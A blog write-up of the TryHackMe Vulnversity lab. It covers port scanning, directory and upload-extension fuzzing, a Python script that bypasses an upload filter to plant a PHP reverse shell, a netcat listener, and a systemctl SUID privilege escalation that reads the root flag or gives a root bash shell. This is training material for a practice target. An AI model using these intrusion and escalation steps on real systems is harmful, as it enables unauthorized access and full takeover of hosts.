---
title: TryHackMe Vulnvercity write-up
date: 2023-02-24 00:28:30 +1300
categories: [IT, CyberSec]
tags: [write-up]
---

## Setup

```bash
$ export ip=10.10.x.x

$ echo "$ip example.com" >> /etc/hosts
```

Web browser visits [http://example.com:port](http://example.com:port)

## 1, recon
```bash

Starting Nmap 7.60 ( [https://nmap.org](https://nmap.org) ) at 2023-01-14 08:10 GMT

Nmap scan report for ip-10-10-251-165.eu-west-1.compute.internal (10.10.251.165)

Host is up (0.0010s latency).

Not shown: 994 closed ports

PORT     STATE SERVICE     VERSION

21/tcp   open  ftp         vsftpd 3.0.3

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

3128/tcp open  http-proxy  Squid http proxy 3.5.12

3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

MAC Address: 02:AE:04:9C:7F:A3 (Unknown)

Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .

Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds

$ time sudo rustscan --ulimit 5000 -a 10.10.54.166 -- -A -oA nmap/rust-open-port

Open 10.10.54.166:22                                                                                                                           

Open 10.10.54.166:21                                                                                                                           

Open 10.10.54.166:139                                                                                                                          

Open 10.10.54.166:445                                                                                                                          

Open 10.10.54.166:3128                                                                                                                         

Open 10.10.54.166:3333

PORT     STATE SERVICE     REASON         VERSION

21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3

22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn

|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=

|   256 3050cb705a865722cb52d93634dca558 (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB

139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12

|_http-server-header: squid/3.5.12

|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))

|_http-server-header: Apache/2.4.18 (Ubuntu)

| http-methods:

|_  Supported Methods: GET HEAD POST OPTIONS

|_http-title: Vuln University

$ whatweb 10.10.2.187:3333

[http://10.10.2.187:3333](http://10.10.2.187:3333) [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.2.187], JQuery, Script, Title[Vuln University]
```
# 2,enum
```bash

$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u [http://10.10.54.166:3333/FUZZ/](http://10.10.54.166:3333/FUZZ/) -e .php,.txt,.bak -fc 403

        /'___\  /'___\           /'___\      

       /\ \__/ /\ \__/  __  __  /\ \__/      

       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\     

        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/     

         \ \_\   \ \_\  \ \____/  \ \_\      

          \/_/    \/_/   \/___/    \/_/      

       v1.5.0 Kali Exclusive <3

________________________________________________

 :: Method           : GET

 :: URL              : [http://10.10.54.166:3333/FUZZ](http://10.10.54.166:3333/FUZZ)

 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt

 :: Extensions       : .txt .bak

 :: Follow redirects : false

 :: Calibration      : false

 :: Timeout          : 10

 :: Threads          : 40

 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500

 :: Filter           : Response status: 403

________________________________________________

css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 276ms]

fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 275ms]

images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 279ms]

index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653, Duration: 278ms]

internal                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 276ms]

js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 280ms]

:: Progress: [14139/14139] :: Job [1/1] :: 143 req/sec :: Duration: [0:01:39] :: Errors: 0 ::

Internal has web form for upload

We will fuzz the allowed list of file extensions

Content of request.txt

POST /internal/index.php HTTP/1.1

Host: vulnuniversity.thm:3333

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------277558272405201676361856688

Content-Length: 338

Origin: [http://vulnuniversity.thm:3333](http://vulnuniversity.thm:3333)

Connection: close

Referer: [http://vulnuniversity.thm:3333/internal/](http://vulnuniversity.thm:3333/internal/)

Upgrade-Insecure-Requests: 1

DNT: 1

Sec-GPC: 1

-----------------------------277558272405201676361856688

Content-Disposition: form-data; name="file"; filename="shell.FUZZ"

Content-Type: application/x-php

-----------------------------277558272405201676361856688

Content-Disposition: form-data; name="submit"

Submit

-----------------------------277558272405201676361856688--

$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d '' -u [http://vulnuniversity.thm:3333/internal/index.php](http://vulnuniversity.thm:3333/internal/index.php)

$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d '' -u [http://vulnunive](http://vulnunive)

rsity.thm:3333/internal/index.php                                                                                            

        /'___\  /'___\           /'___\                                                                                      

       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                      

       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                     

        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                     

         \ \_\   \ \_\  \ \____/  \ \_\                                                                                      

          \/_/    \/_/   \/___/    \/_/                                                                                      

       v1.5.0 Kali Exclusive <3                                                                                              

________________________________________________                                                                             

 :: Method           : POST                                                                                                  

 :: URL              : [http://vulnuniversity.thm:3333/internal/index.php](http://vulnuniversity.thm:3333/internal/index.php)                                                     

 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt                                     

 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0                    

 :: Header           : Accept-Language: en-US,en;q=0.5                                                                       

 :: Header           : Accept-Encoding: gzip, deflate                                                                        

 :: Header           : Host: vulnuniversity.thm:3333                                                                         

 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------277558272405201676361856688    

 :: Header           : Origin: [http://vulnuniversity.thm:3333](http://vulnuniversity.thm:3333)                                                                

 :: Header           : Connection: close                                                                                     

 :: Header           : Referer: [http://vulnuniversity.thm:3333/internal/](http://vulnuniversity.thm:3333/internal/)                                                     

 :: Header           : Upgrade-Insecure-Requests: 1                                                                          

 :: Header           : DNT: 1                                                                                                

 :: Header           : Sec-GPC: 1                                                                                            

 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8         

 :: Data             : -----------------------------277558272405201676361856688                                              

Content-Disposition: form-data; name="file"; filename="shell.FUZZ"                                                           

Content-Type: application/x-php

-----------------------------277558272405201676361856688

Content-Disposition: form-data; name="submit"

Submit

-----------------------------277558272405201676361856688--

 :: Follow redirects : false

 :: Calibration      : false

 :: Timeout          : 10

 :: Threads          : 40

 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500

________________________________________________

xls                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 274ms]

zip                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 275ms]

pdf                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 276ms]

conf                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 278ms]

php3                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]

py                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

phtm                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        

asp                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

shtml                   [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        

cfg                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

jsp                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 550ms]                                        

xlsx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        

php4                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        

pl                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 556ms]                                        

tgz                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]                                        

rb                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

php                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

php5                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

tar.gz                  [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]

cfm                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]

txt                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 825ms]

docx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]

gz                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]

shtm                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

doc                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

aspx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

jhtml                   [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

tar                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

phtml                   [Status: 200, Size: 325, Words: 3, Lines: 2, Duration: 833ms]

cfml                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

:: Progress: [30/30] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

New added 14/01/2023

```bash
# gobuster dir -u [http://$ip:3333](http://$ip:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# gobuster dir -u [http://10.10.251.165:3333](http://10.10.251.165:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)

===============================================================

[+] Url:            [http://10.10.251.165:3333](http://10.10.251.165:3333)

[+] Threads:        10

[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Status codes:   200,204,301,302,307,401,403

[+] User Agent:     gobuster/3.0.1

[+] Timeout:        10s

===============================================================

2023/01/14 08:50:41 Starting gobuster

===============================================================

/images (Status: 301)

/css (Status: 301)

/js (Status: 301)

/fonts (Status: 301)

/internal (Status: 301)

/server-status (Status: 403)

===============================================================

2023/01/14 08:51:00 Finished

===============================================================

```
The parameter -L will let curl to follow 301 redirect
```php
# curl -L [http://10.10.251.165:3333/internal](http://10.10.251.165:3333/internal)

<html>

<head>

<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">

<style>

html, body {

    height: 30%;

}

html {

    display: table;

    margin: auto;

}

body {

    display: table-cell;

    vertical-align: middle;

    text-align: center;

}

</style>

</head>

<body>

<form action="index.php" method="post" enctype="multipart/form-data">

    <h3>Upload</h3><br />

    <input type="file" name="file" id="file">

    <input class="btn btn-primary" type="submit" value="Submit" name="submit">

</form>

</body>

</html>
```
Testing allowed file extension using python
```python

#! /usr/bin/env python

import requests

import os

ip = "10.10.207.82"

url = f"http://{ip}:3333/internal/index.php"

# print (url)

old_filename = "revshell.php"

filename = "revshell"

extensions = [

".php",

".php3",

".php4",

".php5",

".phtml"

]

for ext in extensions:

new_filename = filename + ext

os.rename(old_filename, new_filename)

files = {"file": open(new_filename, "rb")}

r = requests.post(url, files = files)

# print(r)

if "Extension not allowed" in r.text:

print(f"{ext} not allowed")

else:

print(f"{ext} seems to be allowed")

old_filename = new_filename
```
Upload php reverse shell

[https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Update ip address and port

```bash

# nc -lvnp 1234
```


Once getting foot hold inside the machine, we are going to do privilege escalation

SUID (set owner userId upon execution) allow user to run the program or file with the permission of the owner.

One way to find the SUID by executing the following command:
```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \;

-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap

-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn

-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap

-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo         

-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh

-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd

-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec

-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp

-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd

-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger                                         

-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su

-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g

-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount

-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6

-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount

-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl

-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping

-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount

-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs

The following command return similar result

$ find / -perm -u=s -type f 2>/dev/null

Or

$ find / -perm -4000 -type f 2>/dev/null

/usr/bin/newuidmap

/usr/bin/chfn

/usr/bin/newgidmap

/usr/bin/sudo

/usr/bin/chsh

/usr/bin/passwd

/usr/bin/pkexec

/usr/bin/newgrp

/usr/bin/gpasswd

/usr/bin/at

/usr/lib/snapd/snap-confine

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/openssh/ssh-keysign

/usr/lib/eject/dmcrypt-get-device

/usr/lib/squid/pinger

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

/bin/su

/bin/ntfs-3g

/bin/mount

/bin/ping6

/bin/umount

/bin/systemctl

/bin/ping

/bin/fusermount

/sbin/mount.cifs
```

## TASK 5
```bash
/bin/systemctl

GTOFBin gives the following example

TF=$(mktemp).service

echo '[Service]

Type=oneshot

ExecStart=/bin/sh -c "id > /tmp/output"

[Install]

WantedBy=multi-user.target' > $TF

./systemctl link $TF

./systemctl enable --now $TF
```

We have to modify it to export the content of the file to us.
```bash
TF=$(mktemp).service

echo '[Service]

Type=oneshot

ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

[Install]

WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF

/bin/systemctl enable --now $TF

Or we can get root shell access

TF=$(mktemp).service

echo '[Service]

Type=oneshot

ExecStart=/bin/sh -c "chmod +s /bin/bash"

[Install]

WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF

/bin/systemctl enable --now $TF

/bin/bash -p
```


chmod +s gives permission to other user execution rights

/bin/bash -p

$ The End
